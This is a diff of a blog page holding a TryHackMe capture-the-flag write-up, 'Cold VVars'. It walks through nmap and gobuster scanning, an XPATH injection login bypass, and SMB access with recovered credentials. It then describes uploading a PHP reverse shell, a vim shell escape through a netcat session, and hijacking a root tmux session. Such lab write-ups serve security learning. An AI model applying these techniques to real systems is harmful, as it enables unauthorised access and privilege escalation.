@@ -3,7 +3,7 @@
   <head>
     
       <title>
-        Cold_VVars - Write Up ::
+        Cold VVars - Write Up ::
         Lanfran02 - Blog — Where write-ups are made.
       </title>
     
@@ -11,7 +11,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Link Level Creator     Here Medium user    Reconn ╰─ lanfran@parrot ❯ map 10.10.1.67 ─╯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 17:39 CEST Nmap scan report for 10.10.1.67 Host is up (0.14s latency). Not shown: 808 closed ports, 188 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4."
+  content="Link Level Creators     Here Medium fl4shi3r cirius    Reconn We used our big (and only) friend nmap
+╰─ lanfran@parrot ❯ map 10.10.1.67 ─╯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 17:39 CEST Nmap scan report for 10.10.1.67 Host is up (0.14s latency). Not shown: 808 closed ports, 188 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 3.X - 4."
 />
 <meta
   name="keywords"
@@ -45,16 +46,18 @@
 <link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Cold_VVars - Write Up"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/posts/cold_vvars/cover.jpeg"/>
+<meta name="twitter:title" content="Cold VVars - Write Up"/>
 <meta name="twitter:description" content="TryHackMe&#39;s medium level machine."/>
 
 
 
-<meta property="og:title" content="Cold_VVars - Write Up" />
+<meta property="og:title" content="Cold VVars - Write Up" />
 <meta property="og:description" content="TryHackMe&#39;s medium level machine." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/cold_vvars/" />
+<meta property="og:image" content="/posts/cold_vvars/cover.jpeg"/>
 <meta property="article:published_time" content="2021-07-10T17:40:55+02:00" />
 <meta property="article:modified_time" content="2021-07-10T17:40:55+02:00" /><meta property="og:site_name" content="Lanfran02 - Blog" />
 
@@ -206,7 +209,7 @@ if (!doNotTrack) {
   
 
   <div class="post">
-    <h1 class="post-title">Cold_VVars - Write Up</h1>
+    <h1 class="post-title">Cold VVars - Write Up</h1>
     <div class="post-meta">
       
         <span class="post-date">
@@ -226,13 +229,27 @@ if (!doNotTrack) {
 
       
         <span class="post-read-time"
-          >— 5 min read</span
+          >— 6 min read</span
         >
       
     </div>
 
     
       <span class="post-tags">
+        
+          <a href="/tags/gobuster/">#gobuster</a>&nbsp;
+        
+          <a href="/tags/xpath/">#XPATH</a>&nbsp;
+        
+          <a href="/tags/burpsuite/">#Burpsuite</a>&nbsp;
+        
+          <a href="/tags/samba/">#samba</a>&nbsp;
+        
+          <a href="/tags/nc/">#nc</a>&nbsp;
+        
+          <a href="/tags/vim/">#vim</a>&nbsp;
+        
+          <a href="/tags/tmux/">#tmux</a>&nbsp;
         
           <a href="/tags/tryhackme/">#TryHackMe</a>&nbsp;
         
@@ -242,7 +259,7 @@ if (!doNotTrack) {
     
       <figure class="post-cover">
         
-          <img src="/posts/cold_vvars/cover.jpeg" alt="Cold_VVars - Write Up" />
+          <img src="/posts/cold_vvars/cover.jpeg" alt="Cold VVars - Write Up" />
         
 
         
@@ -267,20 +284,19 @@ if (!doNotTrack) {
 <tr>
 <th>Link</th>
 <th>Level</th>
-<th>Creator</th>
+<th>Creators</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><a href="https://tryhackme.com/room/">Here</a></td>
 <td>Medium</td>
-<td><a href="https://tryhackme.com/p/">user</a></td>
+<td><a href="https://tryhackme.com/p/fl4shi3r">fl4shi3r</a> <a href="https://tryhackme.com/p/cirius">cirius</a></td>
 </tr>
 </tbody>
 </table>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
 <h2 id="reconn">Reconn</h2>
+<p>We used our big (and only) friend <code>nmap</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ map 10.10.1.67                                                                                                 ─╯
 Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 17:39 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> 10.10.1.67
@@ -320,7 +336,15 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 58.65 seconds
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/                                                                                   ─╯
+</code></pre></div><p>So let&rsquo;s scan the web servers, because we have 2:</p>
+<ul>
+<li>One running on 8080, an <code>apache</code> powered.</li>
+<li>Another one running on 8082 and powered by <code>Node.js</code>.</li>
+</ul>
+<ol>
+<li>8080 server.</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/                                                                                   ─╯
 <span style="color:#f92672">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
@@ -344,7 +368,8 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <span style="color:#f92672">===============================================================</span>
 2021/07/10 17:40:29 Finished
 <span style="color:#f92672">===============================================================</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/dev -x txt,php                                                                                                                       ─╯
+</code></pre></div><p>Because we found a new endpoint <code>/dev</code> we searched for some specific extensions.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/dev -x txt,php                                                                                                                       ─╯
 <span style="color:#f92672">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
@@ -372,7 +397,11 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <span style="color:#f92672">===============================================================</span>
 2021/07/10 18:20:54 Finished
 <span style="color:#f92672">===============================================================</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8082/                                                                                                                                     ─╯
+</code></pre></div><p>Good, let&rsquo;s save that <code>note.txt</code> for late.</p>
+<ol start="2">
+<li>8082 server.</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan http://10.10.1.67:8082/                                                                                                                                     ─╯
 <span style="color:#f92672">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
@@ -392,13 +421,20 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <span style="color:#f92672">===============================================================</span>
 2021/07/10 17:43:23 Finished
 <span style="color:#f92672">===============================================================</span>
-</code></pre></div><p><img src="info_1.png" alt="info_1"></p>
+</code></pre></div><p>Hmmm a login page. The creator gave us a clue <code>XPATH injection</code>&hellip;</p>
+<p>So maybe this form is vulnerable.</p>
+<p>Therefore I used <code>Burpsuite</code> to exploit this with <a href="XPATH_list.txt">this list</a> to check if I can exploit it :)</p>
+<p><img src="info_1.png" alt="info_1"></p>
+<p>Checking the length of the responses, one of them was different, and we bypass the check and now we got a set of 4 users:password</p>
 <pre><code>Username Password
-Tove Jani
-Godzilla KONGistheKING
-SuperMan snyderCut
-ArthurMorgan DeadEye
-</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=======================================</span> 
+Tove [REDACTED]
+Godzilla [REDACTED]
+SuperMan [REDACTED]
+ArthurMorgan [REDACTED]
+</code></pre><p>Do you remember the result of our <code>nmap</code> scan?</p>
+<p>Use your memory!!</p>
+<p>We found a <code>SAMBA</code> service running, so I used <code>enum4linux</code> to check the shares of the machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=======================================</span> 
 |    Share Enumeration on 10.10.1.67    |
  <span style="color:#f92672">=======================================</span> 
 
@@ -407,36 +443,32 @@ ArthurMorgan DeadEye
 	print$          Disk      Printer Drivers
 	SECURED         Disk      Dev
 	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>incognito server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
-</code></pre></div><h2 id="foothold---user">Foothold - User</h2>
+</code></pre></div><p>Maybe we can try to login with the user:password that we got&hellip;</p>
+<h2 id="foothold---user">Foothold - User</h2>
+<p>And yes, It worked! We can login with the account of <code>ArthurMorgan</code> into the <code>SECURED</code> share! BTW it&rsquo;s the only one that worked&hellip;</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ smbclient //10.10.1.67/SECURED -U ArthurMorgan                                                                 ─╯
-Enter WORKGROUP<span style="color:#ae81ff">\A</span>rthurMorgan<span style="color:#e6db74">&#39;s password: 
-</span><span style="color:#e6db74">Try &#34;help&#34; to get a list of possible commands.
-</span><span style="color:#e6db74">smb: \&gt; ls
-</span><span style="color:#e6db74">  .                                   D        0  Mon Mar 22 00:04:28 2021
-</span><span style="color:#e6db74">  ..                                  D        0  Thu Mar 11 13:52:29 2021
-</span><span style="color:#e6db74">  note.txt                            A       45  Thu Mar 11 13:19:52 2021
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">		7743660 blocks of size 1024. 4447240 blocks available
-</span><span style="color:#e6db74">smb: \&gt; get note.txt
-</span><span style="color:#e6db74">getting file \note.txt of size 45 as note.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
-</span><span style="color:#e6db74">smb: \&gt; cd ..
-</span><span style="color:#e6db74">smb: \&gt; ld
-</span><span style="color:#e6db74">ld: command not found
-</span><span style="color:#e6db74">smb: \&gt; ls
-</span><span style="color:#e6db74">  .                                   D        0  Mon Mar 22 00:04:28 2021
-</span><span style="color:#e6db74">  ..                                  D        0  Thu Mar 11 13:52:29 2021
-</span><span style="color:#e6db74">  note.txt                            A       45  Thu Mar 11 13:19:52 2021
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">		7743660 blocks of size 1024. 4447240 blocks available
-</span><span style="color:#e6db74">smb: \&gt; exit
-</span><span style="color:#e6db74">ca
-</span><span style="color:#e6db74">╭─      ~/Desktop/THM/cold_vvars ▓▒░                                                                   ░▒▓ ✔  15s    10.9.4.9  ─╮
-</span><span style="color:#e6db74">╰─ lanfran@parrot ❯ cat note.txt                                                                                                   ─╯
-</span><span style="color:#e6db74">Secure File Upload and Testing Functionality
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">╭─      ~/Desktop/THM/cold_vvars ▓▒░                                                                           ░▒▓ ✔  10.9.4.9  ─╮
-</span><span style="color:#e6db74">╰─ lanfran@parrot ❯ smbclient //10.10.1.67/SECURED -U ArthurMorgan                                                                 ─╯
-</span><span style="color:#e6db74">Enter WORKGROUP\ArthurMorgan&#39;</span>s password: 
+Enter WORKGROUP<span style="color:#ae81ff">\A</span>rthurMorgan<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Mar <span style="color:#ae81ff">22</span> 00:04:28 <span style="color:#ae81ff">2021</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">11</span> 13:52:29 <span style="color:#ae81ff">2021</span>
+  note.txt                            A       <span style="color:#ae81ff">45</span>  Thu Mar <span style="color:#ae81ff">11</span> 13:19:52 <span style="color:#ae81ff">2021</span>
+
+		<span style="color:#ae81ff">7743660</span> blocks of size 1024. <span style="color:#ae81ff">4447240</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> get note.txt
+getting file <span style="color:#ae81ff">\n</span>ote.txt of size <span style="color:#ae81ff">45</span> as note.txt <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.2 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> exit
+
+</code></pre></div><p>Listing the files on the directory, we find a <code>note.txt</code> file&hellip; Hmmm looks familiar&hellip;</p>
+<p>This is a memory machine XD</p>
+<p>Going back on our findings, we have already found this <code>note.txt</code> file&hellip;</p>
+<p>Yes! in <code>gobuster</code> found it for us, inside the <code>/dev</code> folder!</p>
+<p>So let&rsquo;s upload a reverse shell to the server!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ cat note.txt                                                                                                   ─╯
+Secure File Upload and Testing Functionality
+
+╰─ lanfran@parrot ❯ smbclient //10.10.1.67/SECURED -U ArthurMorgan                                                                 ─╯
+Enter WORKGROUP<span style="color:#ae81ff">\A</span>rthurMorgan<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
 smb: <span style="color:#ae81ff">\&gt;</span> put shell_online.php 
 putting file shell_online.php as <span style="color:#ae81ff">\s</span>hell_online.php <span style="color:#f92672">(</span>27.9 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 27.9 kb/s<span style="color:#f92672">)</span>
@@ -459,9 +491,9 @@ drwxr-xr-x  <span style="color:#ae81ff">8</span> marston      marston      <span
 drwxr-xr-x  <span style="color:#ae81ff">6</span> ArthurMorgan ArthurMorgan <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">28</span> 13:23 ArthurMorgan
 drwxr-xr-x <span style="color:#ae81ff">25</span> root         root         <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">28</span> 12:59 ..
 drwxr-xr-x  <span style="color:#ae81ff">4</span> root         root         <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span> 21:46 .
-</code></pre></div><p>And we can read the user&rsquo;s flag.</p>
+</code></pre></div><p>And we can read the user&rsquo;s flag inside <code>/home/ArthurMorgan/user.txt</code>.</p>
 <h2 id="root">Root</h2>
-<p>We switched to arthurmorgan with the password, and run the command <code>netstat -tulwn</code></p>
+<p>We switched to <code>arthurmorgan</code> with the password, and run the command <code>netstat -tulwn</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ArthurMorgan@incognito:/var/www/html/dev$ netstat -tulwn
 Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
 Proto Recv-Q Send-Q Local Address           Foreign Address         State      
@@ -483,7 +515,8 @@ udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff"
 udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.138.243:138       0.0.0.0:*                          
 udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:138             0.0.0.0:*                          
 raw6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::58                   :::*                    <span style="color:#ae81ff">7</span>               
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ArthurMorgan@incognito:~$ nc -nlvp <span style="color:#ae81ff">4545</span>
+</code></pre></div><p>We found a port <code>4545</code> accepting connections just from the machine itself, so what if we use <code>netcat</code>&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ArthurMorgan@incognito:~$ nc -nlvp <span style="color:#ae81ff">4545</span>
 Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 4545<span style="color:#f92672">)</span>
 Connection from 127.0.0.1 <span style="color:#ae81ff">37376</span> received!
 
@@ -493,7 +526,23 @@ ideaBox
 2.Delete
 3.Steal others<span style="color:#e6db74">&#39; Trash
 </span><span style="color:#e6db74">4.Show&#39;</span>nExit
-:shellhell<span style="color:#f92672">=</span>/bin/sh
+</code></pre></div><p>Wow! It&rsquo;s giving us options to select!</p>
+<p>Trying with every option, I figured out that the option 4 opens a <code>vim</code> editor, so I can exploit that!</p>
+<p>With the following code from <a href="https://gtfobins.github.io/gtfobins/vim/">GTFOBins</a>:</p>
+<pre><code>vim
+:set shell=/bin/sh #I used bash :p
+:shell
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ArthurMorgan@incognito:~$ nc -nlvp <span style="color:#ae81ff">4545</span>
+Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 4545<span style="color:#f92672">)</span>
+Connection from 127.0.0.1 <span style="color:#ae81ff">37376</span> received!
+
+
+ideaBox
+1.Write
+2.Delete
+3.Steal others<span style="color:#e6db74">&#39; Trash
+</span><span style="color:#e6db74">4.Show&#39;</span>nExit
+:set shell<span style="color:#f92672">=</span>/bin/bash
 ~                                                                               
 ~                                                                               
 ~                                                                               
@@ -519,9 +568,11 @@ ideaBox
 :shell
 id
 uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>marston<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>marston<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>marston<span style="color:#f92672">)</span>
-</code></pre></div><p>And running <code>ps -eaf --forest</code> we can see that there are some sessions running on it, so let&rsquo;s check them!</p>
-<p>To attach your shell to the session, you need to use <code>tmux attach-session -t 0</code></p>
-<p>And after exiting some sessions, we get a <code>root</code> session!!</p>
+</code></pre></div><p>(It&rsquo;s a little bugged the code, but I just copy pasted the GTFOBins&rsquo;s code and worked!)</p>
+<p>We have now a shell as <code>marston</code>!!</p>
+<p>And running <code>ps -eaf --forest</code> we can see that there are some <code>tmux</code> sessions running on it, so let&rsquo;s check them!</p>
+<p>To attach your shell to <code>tmux</code> the session, you need to use <code>tmux attach-session -t 0</code></p>
+<p>After exiting some sessions, we get a <code>root</code> session!!</p>
 <p><img src="root.png" alt="root"></p>
 <p>And we rooted the machine!</p>
 <p>That&rsquo;s all from my side, hope you find this helpful!</p>
